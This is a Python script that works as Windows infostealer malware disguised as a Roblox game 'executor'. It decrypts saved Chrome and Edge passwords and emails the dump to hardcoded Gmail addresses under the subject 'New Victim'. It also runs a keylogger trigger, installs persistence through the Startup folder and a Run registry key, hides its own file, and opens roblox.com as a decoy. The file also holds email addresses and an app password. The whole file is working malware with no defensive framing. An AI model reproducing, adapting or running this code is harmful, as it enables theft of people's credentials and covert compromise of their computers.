import os
import sqlite3
import win32crypt
import smtplib
from email.mime.text import MIMEText
from pynput.keyboard import Listener
import threading
import webbrowser
import winreg
import shutil
import json
from Crypto.Cipher import AES
import base64

EMAILS = ["c785727@gmail.com", "xboxblack638@gmail.com"]
APP_PASS = "bhyloqvziwlhvekx"  # Replace with real app password for c785727@gmail.com

def get_master_key(browser_base):
    try:
        local_state = os.path.join(browser_base, "Local State")
        with open(local_state, "r", encoding="utf-8") as f:
            data = json.loads(f.read())
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(encrypted, master_key):
    try:
        if encrypted[:3] in (b'v10', b'v11'):
            iv = encrypted[3:15]
            ciphertext = encrypted[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(ciphertext)[:-16].decode('utf-8', errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except:
        return "DECRYPT_FAILED"

def steal_all_logins():
    stolen = "=== FULL BROWSER PASSWORD DUMP ===\n\n"
    browsers = {
        "Chrome": os.path.expanduser("\~") + r"\AppData\Local\Google\Chrome\User Data",
        "Edge": os.path.expanduser("\~") + r"\AppData\Local\Microsoft\Edge\User Data"
    }
    
    for browser_name, base_path in browsers.items():
        if not os.path.exists(base_path):
            continue
        master_key = get_master_key(base_path)
        if not master_key:
            continue
        
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
        for profile in profiles:
            login_path = os.path.join(base_path, profile, "Login Data")
            if not os.path.exists(login_path):
                continue
            try:
                conn = sqlite3.connect(login_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url, user, enc = row
                    if enc:
                        pwd = decrypt_password(enc, master_key)
                        stolen += f"{browser_name} | {url} | Username: {user} | Password: {pwd}\n"
                conn.close()
            except:
                pass
    
    if len(stolen) > 100:  # only send if something substantial was found
        send_to_emails(stolen)
        print("Full login dump stolen and sent to both emails!")
    else:
        print("No logins found this time.")

def send_to_emails(data):
    for email in EMAILS:
        msg = MIMEText(data)
        msg['Subject'] = "Full Browser Password Dump - New Victim"
        msg['From'] = EMAILS[0]
        msg['To'] = email
        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.login(EMAILS[0], APP_PASS)
            server.sendmail(EMAILS[0], email, msg.as_string())
            server.quit()
            print(f"Sent to {email}")
        except:
            pass

def keylogger():
    def on_press(key):
        try:
            k = str(key).lower()
            if any(word in k for word in ["password", "login", "username"]):
                steal_all_logins()
        except:
            pass
    with Listener(on_press=on_press) as l:
        l.join()

# Main
if __name__ == "__main__":
    # Persistence
    try:
        startup = os.path.expanduser("\~") + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        current = os.path.abspath(__file__)
        shutil.copy(current, os.path.join(startup, "WindowsUpdater.py"))
        os.system(f'attrib +h "{current}"')
    except:
        pass
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "GameExecutor", 0, winreg.REG_SZ, os.path.abspath(__file__))
        winreg.CloseKey(key)
    except:
        pass

    threading.Thread(target=keylogger, daemon=True).start()
    webbrowser.open("https://www.roblox.com")
    print("Executor Injected Successfully!")
    steal_all_logins()  # immediate full dump

    input("Press Enter to keep running...")
